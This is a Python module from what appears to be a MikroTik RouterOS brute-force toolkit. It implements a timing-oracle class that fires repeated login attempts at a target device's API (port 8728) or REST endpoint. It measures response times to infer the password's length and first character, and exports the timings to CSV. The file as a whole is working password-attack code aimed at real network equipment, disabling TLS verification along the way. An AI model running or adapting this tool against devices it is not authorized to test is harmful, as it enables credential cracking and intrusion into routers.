#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: André Henrique (LinkedIn/X: @mrhenrike)
# Version: 1.0.0

"""
Timing Oracle Module — MikrotikAPI-BF
=====================================
Runs timing-based probes for password length and character candidates.
"""

from __future__ import annotations

import csv
import statistics
import time
from pathlib import Path
from typing import Dict, List, Optional, Sequence

import requests


class TimingOracleAttacker:
    """Measure auth timing to detect potential side-channel leaks."""

    CHARSETS: Dict[str, str] = {
        "alphanum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "printable": "".join(chr(i) for i in range(32, 127)),
        "full": "".join(chr(i) for i in range(1, 256)),
    }

    def __init__(self, target: str, username: str, timeout: float = 2.0) -> None:
        self.target = target
        self.username = username
        self.timeout = timeout

    def run(
        self,
        samples: int = 100,
        charset_name: str = "alphanum",
        fixed_length: Optional[int] = None,
        mode: str = "api",
        report_csv: Optional[str] = None,
    ) -> Dict[str, object]:
        """Execute timing oracle for length + first-character probing."""
        if mode not in {"api", "rest"}:
            raise ValueError("mode must be 'api' or 'rest'")
        charset = self.CHARSETS.get(charset_name, self.CHARSETS["alphanum"])

        length_probe = self.length_oracle(samples=samples, mode=mode) if fixed_length is None else {
            "best_length": fixed_length,
            "scores": {},
        }
        target_length = int(length_probe["best_length"])
        char_probe = self.char_oracle(position=0, length=target_length, samples=samples, charset=charset, mode=mode)

        result: Dict[str, object] = {
            "target": self.target,
            "username": self.username,
            "mode": mode,
            "samples": samples,
            "length_probe": length_probe,
            "char_probe": char_probe,
            "signal_detected": bool(char_probe.get("best_char")),
        }
        if report_csv:
            self._write_csv(report_csv, length_probe, char_probe)
            result["report_csv"] = report_csv
        return result

    def length_oracle(self, samples: int, mode: str, max_len: int = 20) -> Dict[str, object]:
        """Estimate likely password length using timing means."""
        scores: Dict[int, float] = {}
        for length in range(1, max_len + 1):
            candidate = "A" * length
            samples_list = self._collect_samples(candidate, samples, mode)
            scores[length] = statistics.mean(samples_list) if samples_list else 0.0
        best_length = max(scores, key=scores.get)
        return {"best_length": best_length, "scores": scores}

    def char_oracle(
        self,
        position: int,
        length: int,
        samples: int,
        charset: str,
        mode: str,
    ) -> Dict[str, object]:
        """Estimate best character candidate for a given position."""
        means: Dict[str, float] = {}
        for char in charset:
            candidate = ("A" * position) + char + ("A" * max(0, length - position - 1))
            samples_list = self._collect_samples(candidate, samples, mode)
            means[char] = statistics.mean(samples_list) if samples_list else 0.0
        best_char = max(means, key=means.get) if means else None
        return {"position": position, "means": means, "best_char": best_char}

    def _collect_samples(self, password_candidate: str, samples: int, mode: str) -> List[float]:
        values: List[float] = []
        for _ in range(samples):
            started = time.perf_counter_ns()
            if mode == "api":
                self._probe_api(password_candidate)
            else:
                self._probe_rest(password_candidate)
            ended = time.perf_counter_ns()
            values.append((ended - started) / 1000.0)  # microseconds
        return values

    def _probe_api(self, password_candidate: str) -> None:
        try:
            from core.api import Api
            api = Api(self.target, 8728, timeout=self.timeout)
            api.login(self.username, password_candidate)
            api.disconnect()
        except Exception:
            return

    def _probe_rest(self, password_candidate: str) -> None:
        try:
            requests.get(
                f"http://{self.target}:80/rest/system/resource",
                auth=(self.username, password_candidate),
                timeout=self.timeout,
                verify=False,
            )
        except Exception:
            return

    @staticmethod
    def _write_csv(path: str, length_probe: Dict[str, object], char_probe: Dict[str, object]) -> None:
        output_path = Path(path)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with output_path.open("w", encoding="utf-8", newline="") as handle:
            writer = csv.writer(handle)
            writer.writerow(["section", "key", "value"])
            for length, score in (length_probe.get("scores") or {}).items():
                writer.writerow(["length", length, score])
            for char, score in (char_probe.get("means") or {}).items():
                writer.writerow(["char", char, score])
